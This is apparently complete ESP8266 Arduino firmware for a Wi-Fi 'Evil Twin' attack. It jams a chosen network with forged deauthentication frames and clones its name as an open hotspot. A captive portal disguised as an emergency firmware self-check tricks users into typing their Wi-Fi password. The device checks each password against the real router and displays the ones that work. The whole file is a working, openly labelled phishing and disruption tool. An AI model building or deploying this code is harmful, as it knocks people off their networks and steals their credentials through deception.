#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

#define AP_IP IPAddress(192, 168, 123, 1)
#define AP_GATEWAY IPAddress(255, 255, 255, 0)

String _correct = "";
String _tryPassword = "";

String WIFI_SSID = "HUAWEI-668AVA";
String WIFI_PASSWORD = "dokidoki";

String FAKE_TITLE = "紧急自救模式";
// Default main strings
String FAKE_HEAD = "<head><title>"+ FAKE_TITLE +"</title><meta name=viewport content='width=device-width,initial-scale=1'><style>"
                   "article { background: #f2f2f2; padding: 1.3em; }"
                   "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                   "div { padding: 0.5em; }"
                   "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
                   "input { width: 50%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
                   "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
                   "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
                   "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }"
                   "textarea { width: 100%; }"
                   "</style> <meta http-equiv='Content-Type' content='text/html; charset=utf-8'></head>";
String FAKE_BODY = "<body><nav>"+ FAKE_TITLE +"</nav> <div><div>"
                    "设备硬件版本验证 ✅ <br>"
                    "设备硬件自检 ✅ <br>"
                    "设备版本号验证 ✅ <br>"
                    "设备固件MD5校验 ✅ <br>"
                    "设备配置文件校验 ✅ <br>"
                    "设备Wifi模块独立校验 ✖"
                    "</div><div> ⚠️ 读取WIFI密码异常，请重新输入Wifi密码重置Wifi </div><div>"
                    "<form action='/' method=post> <input type=password id='password' name='password' minlength='8' placeholder='WIFI 密码'>"
                    "</input> <input type=submit value=重试></input>"
                    "</form></div><div class=q><a>&#169; All rights reserved.</a></div></div></body>";

String FAKE_SERVER_VERIFY = "<!DOCTYPE html><html><head><title>紧急自救模式</title>"
                    "<script> setTimeout(function(){window.location.href = '/result';}, 30000); </script><style>"
                    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'></head>"
                    "<body><nav>紧急自救模式</nav><center><h2 style='font-size:4vw'>验证WIFI中, 请稍后...<br>"
                    "<progress value='33' max='100'>33%</progress></h2></center></body></html>";

String FAKE_SERVER_ERROR_PWD = "<!DOCTYPE html><html><head><title>紧急自救模式</title>"
                    "<script> setTimeout(function(){window.location.href = '/result';}, 30000); </script><style>"
                    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
                    "<script> setTimeout(function(){window.location.href = '/';}, 4000); </script>"
                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                    "<body><nav>紧急自救模式</nav><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:40px;width:40px;height:40px'>&#8855;</wrong>"
                    "<br><br>密码错误</h2></body></html>";

String MainServerTemp = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                  "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
                  "<style>.content {max-width: 50%;margin: auto;}.button {display: inline-block;padding: 10px 20px;border: none;border-radius: 8px;cursor: pointer;transition: background-color 0.3s;background-color: #007bff;color: #fff;}.button:hover {background-color: #333;}.button-table {display: inline-block;padding: 5px 10px;border: none;border-radius: 5px;cursor: pointer;transition: background-color 0.3s;background-color: #007bff;color: #fff;}.button-table:hover {background-color: #333;color: #fff;}.button-table-selected {display: inline-block;padding: 5px 10px;border: none;border-radius: 5px;cursor: pointer;transition: background-color 0.3s;background-color: #28a745;color: #fff;}table {width: 100%; border-collapse: collapse;margin: 12px auto;border-radius: 8px;}th,td {padding: 5px; border: 1px solid #ddd; text-align: center;}th {background-color: #f0f0f0; font-weight: bold; }tr:nth-child(even) { background-color: #f9f9f9;}@media (max-width: 768px) {.content {max-width: 90%;margin: auto;}th,td {font-size: 12px; }}</style>"
                  "</head><body><div class='content'>"
                  "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'><button class='button button-primary' {disabled}>{deauth_button}</button></form></div><div><form style='display:inline-block;' method='post'action='/?hotspot={hotspot}'><button class='button button-primary' {disabled}>{hotspot_button}</button></form></div></br><table><tr><th>名称</th><th>MAC地址</th><th>频道</th><th>操作</th></tr>";

void setup() {

  Serial.begin(115200);

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
  WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
  dnsServer.start(53, "*", AP_IP);

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/manager", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", FAKE_SERVER_ERROR_PWD);
    Serial.println("Someone entered the wrong WIFI password. ["+_tryPassword+"]");
  } else {
    if (_selectedNetwork.ssid != "" && _tryPassword != ""){
      _correct = "WIFI crack success, ssid: " + _selectedNetwork.ssid + ", password: " + _tryPassword;
      Serial.println(_correct);
    }
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
    WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
    dnsServer.start(53, "*", AP_IP);
  }
}

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", AP_IP);

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
      WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
      dnsServer.start(53, "*", AP_IP);
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = MainServerTemp;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button class='button-table-selected'>已选择</button></form></td></tr>";
      } else {
        _html += "<button class='button-table'>选择</button></form></td></tr>";
      }
    }

    String showedName = _selectedNetwork.ssid==""?"":"["+_selectedNetwork.ssid+"]";

    if (deauthing_active) {
      _html.replace("{deauth_button}", "停止"+showedName+"断网攻击");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "启动"+showedName+"断网攻击");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "停止"+showedName+"钓鱼热点");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "启动"+showedName+"钓鱼热点");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " 不可用");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", FAKE_SERVER_VERIFY);
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", FAKE_HEAD+FAKE_BODY);
    }
  }

}

void handleAdmin() {

  String _html = MainServerTemp;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start" && _selectedNetwork.ssid.c_str() != "") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", AP_IP);

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
      WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
      dnsServer.start(53, "*", AP_IP);
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
unsigned int wifiStatus = WL_DISCONNECTED;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 1000) {
    int status = WiFi.status();
    if(status != wifiStatus){
      Serial.println(status == WL_CONNECTED?"Someone connect to AP." : "Wifi AP Stauts -> " + status);
    }
    wifiStatus = status;
    wifinow = millis();
  }
}
